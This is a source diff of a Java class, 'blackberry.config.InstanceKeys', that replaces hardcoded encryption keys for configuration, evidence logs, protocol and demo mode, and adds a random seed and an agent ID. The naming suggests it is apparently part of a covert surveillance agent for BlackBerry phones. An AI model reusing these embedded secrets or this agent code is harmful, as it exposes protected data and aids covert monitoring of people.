@@ -3,51 +3,64 @@ package blackberry.config;
 
 public class InstanceKeys extends KeysGetter {
 
-    //private static String conf = "Adf5V57gQtyi90wUhpb8Neg56756j87R";
-    private byte[] conf = new byte[] { (byte) 0x41, (byte) 0x64, (byte) 0x66,
-            (byte) 0x35, (byte) 0x56, (byte) 0x35, (byte) 0x37, (byte) 0x67,
-            (byte) 0x51, (byte) 0x74, (byte) 0x79, (byte) 0x69, (byte) 0x39,
-            (byte) 0x30, (byte) 0x77, (byte) 0x55, (byte) 0x68, (byte) 0x70,
-            (byte) 0x62, (byte) 0x38, (byte) 0x4e, (byte) 0x65, (byte) 0x67,
-            (byte) 0x35, (byte) 0x36, (byte) 0x37, (byte) 0x35, (byte) 0x36,
-            (byte) 0x6a, (byte) 0x38, (byte) 0x37, (byte) 0x52 };
+    // require 'digest/md5'
+    // .unpack("c*").map { |c| ",(byte) 0x" + c.to_s(16) }.join("")
+    // Digest::MD5.hexdigest(a)
+    //private static String conf = "6uo_E0S4w_FD0j9NEhW2UpFw9rwy90LY";
+    private byte[] conf = new byte[] { (byte) 0x36, (byte) 0x75, (byte) 0x6f,
+            (byte) 0x5f, (byte) 0x45, (byte) 0x30, (byte) 0x53, (byte) 0x34,
+            (byte) 0x77, (byte) 0x5f, (byte) 0x46, (byte) 0x44, (byte) 0x30,
+            (byte) 0x6a, (byte) 0x39, (byte) 0x4e, (byte) 0x45, (byte) 0x68,
+            (byte) 0x57, (byte) 0x32, (byte) 0x55, (byte) 0x70, (byte) 0x46,
+            (byte) 0x77, (byte) 0x39, (byte) 0x72, (byte) 0x77, (byte) 0x79,
+            (byte) 0x39, (byte) 0x30, (byte) 0x4c, (byte) 0x59 };
 
-    //private static String log = "3j9WmmDgBqyU270FTid3719g64bP4s52";
-    private byte[] log = new byte[] { (byte) 0x33, (byte) 0x6a, (byte) 0x39,
-            (byte) 0x57, (byte) 0x6d, (byte) 0x6d, (byte) 0x44, (byte) 0x67,
-            (byte) 0x42, (byte) 0x71, (byte) 0x79, (byte) 0x55, (byte) 0x32,
-            (byte) 0x37, (byte) 0x30, (byte) 0x46, (byte) 0x54, (byte) 0x69,
-            (byte) 0x64, (byte) 0x33, (byte) 0x37, (byte) 0x31, (byte) 0x39,
-            (byte) 0x67, (byte) 0x36, (byte) 0x34, (byte) 0x62, (byte) 0x50,
-            (byte) 0x34, (byte) 0x73, (byte) 0x35, (byte) 0x32 };
+    //private static String evidence = "WfClq6HxbSaOuJGaH5kWXr7dQgjYNSNg";
+    private byte[] log = new byte[] { (byte) 0x57, (byte) 0x66, (byte) 0x43,
+            (byte) 0x6c, (byte) 0x71, (byte) 0x36, (byte) 0x48, (byte) 0x78,
+            (byte) 0x62, (byte) 0x53, (byte) 0x61, (byte) 0x4f, (byte) 0x75,
+            (byte) 0x4a, (byte) 0x47, (byte) 0x61, (byte) 0x48, (byte) 0x35,
+            (byte) 0x6b, (byte) 0x57, (byte) 0x58, (byte) 0x72, (byte) 0x37,
+            (byte) 0x64, (byte) 0x51, (byte) 0x67, (byte) 0x6a, (byte) 0x59,
+            (byte) 0x4e, (byte) 0x53, (byte) 0x4e, (byte) 0x67 };
 
-    //private static String proto = "f7Hk0f5usd04apdvqw13F5ed25soV5eD";
-    private byte[] proto = new byte[] { (byte) 0x66, (byte) 0x37, (byte) 0x48,
-            (byte) 0x6b, (byte) 0x30, (byte) 0x66, (byte) 0x35, (byte) 0x75,
-            (byte) 0x73, (byte) 0x64, (byte) 0x30, (byte) 0x34, (byte) 0x61,
-            (byte) 0x70, (byte) 0x64, (byte) 0x76, (byte) 0x71, (byte) 0x77,
-            (byte) 0x31, (byte) 0x33, (byte) 0x46, (byte) 0x35, (byte) 0x65,
-            (byte) 0x64, (byte) 0x32, (byte) 0x35, (byte) 0x73, (byte) 0x6f,
-            (byte) 0x56, (byte) 0x35, (byte) 0x65, (byte) 0x44 };
+    //private static String signature = "ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ";
+    private byte[] proto = new byte[] { (byte) 0x41, (byte) 0x4e, (byte) 0x67,
+            (byte) 0x73, (byte) 0x39, (byte) 0x6f, (byte) 0x47, (byte) 0x46,
+            (byte) 0x6e, (byte) 0x45, (byte) 0x4c, (byte) 0x5f, (byte) 0x76,
+            (byte) 0x78, (byte) 0x54, (byte) 0x78, (byte) 0x65, (byte) 0x39,
+            (byte) 0x65, (byte) 0x49, (byte) 0x79, (byte) 0x42, (byte) 0x78,
+            (byte) 0x35, (byte) 0x6c, (byte) 0x5a, (byte) 0x78, (byte) 0x66,
+            (byte) 0x64, (byte) 0x36, (byte) 0x51, (byte) 0x5a };
 
-    //static String demo = "hxVtdxJ/Z8LvK3ULSnKRUmLE"; //MD5: baba73e67e39db5d94f3c67a58d52c52
-    private byte[] demo = new byte[] { (byte) 0x68, (byte) 0x78, (byte) 0x56,
-            (byte) 0x74, (byte) 0x64, (byte) 0x78, (byte) 0x4a, (byte) 0x2f,
-            (byte) 0x5a, (byte) 0x38, (byte) 0x4c, (byte) 0x76, (byte) 0x4b,
-            (byte) 0x33, (byte) 0x55, (byte) 0x4c, (byte) 0x53, (byte) 0x6e,
-            (byte) 0x4b, (byte) 0x52, (byte) 0x55, (byte) 0x6d, (byte) 0x4c,
-            (byte) 0x45 };
+    // require 'digest/md5'
+    // Digest::MD5.hexdigest("Pg-WaVyPzMMMMmGbhP6qAigT")
+    //static String demo = "Pg-WaVyPzMMMMmGbhP6qAigT"; //MD5: 863d9effe70187254d3c5e9c76613a99
+    private byte[] demo = new byte[] { (byte) 0x50, (byte) 0x67, (byte) 0x2d,
+            (byte) 0x57, (byte) 0x61, (byte) 0x56, (byte) 0x79, (byte) 0x50,
+            (byte) 0x7a, (byte) 0x4d, (byte) 0x4d, (byte) 0x4d, (byte) 0x4d,
+            (byte) 0x6d, (byte) 0x47, (byte) 0x62, (byte) 0x68, (byte) 0x50,
+            (byte) 0x36, (byte) 0x71, (byte) 0x41, (byte) 0x69, (byte) 0x67,
+            (byte) 0x54 };
 
-    static String buildID = "av3pVck1gb4eR2"; // MD5: 7f9e6a0ed9965458d8c1f1a558713e9d
+    // static String randomSeed = "B3lZ3bupLuI4p7QEPDgNyWacDzNmk1pW"
+    private byte[] randomSeed = new byte[] { (byte) 0x42, (byte) 0x33,
+            (byte) 0x6c, (byte) 0x5a, (byte) 0x33, (byte) 0x62, (byte) 0x75,
+            (byte) 0x70, (byte) 0x4c, (byte) 0x75, (byte) 0x49, (byte) 0x34,
+            (byte) 0x70, (byte) 0x37, (byte) 0x51, (byte) 0x45, (byte) 0x50,
+            (byte) 0x44, (byte) 0x67, (byte) 0x4e, (byte) 0x79, (byte) 0x57,
+            (byte) 0x61, (byte) 0x63, (byte) 0x44, (byte) 0x7a, (byte) 0x4e,
+            (byte) 0x6d, (byte) 0x6b, (byte) 0x31, (byte) 0x70, (byte) 0x57 };
+
+    static String agentID = "EMp7Ca7-fpOBIr"; // MD5: b1688ffaaaafd7c1cab52e630b53178f
 
     private static byte[] byteLogKey;
     private static byte[] byteProtoKey;
     private static byte[] byteConfKey;
     private static byte[] byteInstanceID;
 
-    
     boolean seven = true;
-    
+
     public InstanceKeys() {
     }
 
@@ -60,7 +73,7 @@ public class InstanceKeys extends KeysGetter {
         if (byteLogKey == null) {
             byteLogKey = keyFromString(log);
             if (byteLogKey == null) {
-                seven=false;
+                seven = false;
                 byteLogKey = log;
             }
 
@@ -74,7 +87,7 @@ public class InstanceKeys extends KeysGetter {
      * @return the builds the id
      */
     public byte[] getBuildID() {
-        return buildID.getBytes();
+        return agentID.getBytes();
     }
 
     /**
@@ -86,7 +99,7 @@ public class InstanceKeys extends KeysGetter {
         if (byteProtoKey == null) {
             byteProtoKey = keyFromString(proto);
             if (byteProtoKey == null) {
-                seven=false;
+                seven = false;
                 byteProtoKey = proto;
             }
         }
@@ -103,7 +116,7 @@ public class InstanceKeys extends KeysGetter {
         if (byteConfKey == null) {
             byteConfKey = keyFromString(conf);
             if (byteConfKey == null) {
-                seven=false;
+                seven = false;
                 byteConfKey = conf;
             }
         }
@@ -115,6 +128,10 @@ public class InstanceKeys extends KeysGetter {
         return demo;
     }
     
+    public byte[] getRandomSeed() {
+        return randomSeed;
+    }
+
     public boolean isSeven() {
         return seven;
     }
